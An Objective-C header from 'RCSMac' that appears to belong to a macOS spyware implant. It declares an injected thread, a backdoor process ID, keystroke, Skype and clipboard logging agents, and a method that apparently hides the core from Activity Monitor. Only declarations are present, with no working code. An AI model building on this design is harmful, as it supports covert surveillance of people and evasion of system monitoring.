/*
 * RCSMac - Input Manager
 * 
 * Created by Alfredo 'revenge' Pesoli on 28/04/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <CoreAudio/CoreAudio.h>
#import <Cocoa/Cocoa.h>

#ifndef __RCSMInputManager_h__
#define __RCSMInputManager_h__

#import "RCSMCommon.h"
#import "RCSMSharedMemory.h"
#import "RCSMAgentInputLogger.h"

#import "RCSMAgentIMSkype.h"
#import "RCSMAgentClipboard.h"


extern RCSMSharedMemory *mSharedMemoryCommand;
extern RCSMSharedMemory *mSharedMemoryLogging;
extern int32_t gBackdoorPID;

@interface RCSMInputManager : NSObject

//
// @author
//  revenge
// @abstract
//  Initialize shared memory regions
//
+ (BOOL)initSharedMemory;

//
// @author
//  revenge
// @abstract
//  Send and receives generic command to/from the core
//
+ (void)checkForCommands;

//
// @author
//  revenge
// @abstract
//  This function will just spawn the main injected thread
//
+ (void)startThreadCommunicator: (NSNotification *)_notification;

//
// @author
//  revenge
// @abstract
//  This function will detach the app from shared memory upon termination
//
+ (void)closeThreadCommunicator: (NSNotification *)_notification;

+ (void)hideCoreFromAM;

//
// @abstract
//  This function will be responsible of communicating with our Core in order
//  to read the passed configuration and start all the required external agents
//
+ (void)startCoreCommunicator;

+ (void)getSystemVersionMajor: (u_int *)major
                        minor: (u_int *)minor
                       bugFix: (u_int *)bugFix;

@end

#endif
